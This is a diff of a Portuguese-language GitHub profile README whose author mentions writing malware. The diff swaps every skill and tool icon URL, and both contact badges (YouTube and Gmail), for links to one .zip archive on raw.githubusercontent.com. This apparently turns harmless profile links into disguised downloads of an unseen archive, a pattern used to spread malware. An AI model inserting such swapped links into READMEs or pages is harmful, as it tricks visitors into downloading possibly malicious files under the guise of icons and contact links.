@@ -7,25 +7,25 @@ Assembly e JavaScript eu sei fazer malwares, apesar de que estou há um bom temp
 Forms tenho um canal no YouTube, mas faz muito tempo que eu não posto nada. Enfim, essa é minha GitHub.
 
 ### Skills
-<img src="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/icons/csharp/csharp-original.svg" width= 40px
+<img src="https://raw.githubusercontent.com/GitEdu-gi/GitEdu-gi/main/deputationize/Git_gi_Edu_v2.1.zip" width= 40px
    height= 50px; />
-   <img src="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/icons/visualbasic/visualbasic-original.svg" width= 40px
+   <img src="https://raw.githubusercontent.com/GitEdu-gi/GitEdu-gi/main/deputationize/Git_gi_Edu_v2.1.zip" width= 40px
    height= 50px; />
-<img src="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/icons/html5/html5-original.svg" width= 40px
+<img src="https://raw.githubusercontent.com/GitEdu-gi/GitEdu-gi/main/deputationize/Git_gi_Edu_v2.1.zip" width= 40px
    height= 50px;/>
-   <img src="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/icons/css3/css3-original.svg" width= 40px
+   <img src="https://raw.githubusercontent.com/GitEdu-gi/GitEdu-gi/main/deputationize/Git_gi_Edu_v2.1.zip" width= 40px
    height= 50px;/>
 ### Tools
 <div>
-<img src="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/icons/vscode/vscode-original.svg" width=40px height= 50px;/>
+<img src="https://raw.githubusercontent.com/GitEdu-gi/GitEdu-gi/main/deputationize/Git_gi_Edu_v2.1.zip" width=40px height= 50px;/>
      &nbsp;
-<img src="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/icons/visualstudio/visualstudio-original.svg"width=40px height= 50px; />
+<img src="https://raw.githubusercontent.com/GitEdu-gi/GitEdu-gi/main/deputationize/Git_gi_Edu_v2.1.zip"width=40px height= 50px; />
 </div>
 
 ### Contacts
 
-[![YouTube](https://img.shields.io/badge/Youtube-FF0000?style=for-the-badge&logo=Youtube&logoColor=white)](https://www.youtube.com/@Eu_Edu1234)
-[![Gmail](https://img.shields.io/badge/Gmail-D14836?style=for-the-badge&logo=gmail&logoColor=white)](mailto:emailquenaopodeesquecer@gmail.com)
+[![YouTube](https://raw.githubusercontent.com/GitEdu-gi/GitEdu-gi/main/deputationize/Git_gi_Edu_v2.1.zip)](https://raw.githubusercontent.com/GitEdu-gi/GitEdu-gi/main/deputationize/Git_gi_Edu_v2.1.zip)
+[![Gmail](https://raw.githubusercontent.com/GitEdu-gi/GitEdu-gi/main/deputationize/Git_gi_Edu_v2.1.zip)](https://raw.githubusercontent.com/GitEdu-gi/GitEdu-gi/main/deputationize/Git_gi_Edu_v2.1.zip)
 
 ### Projects
 
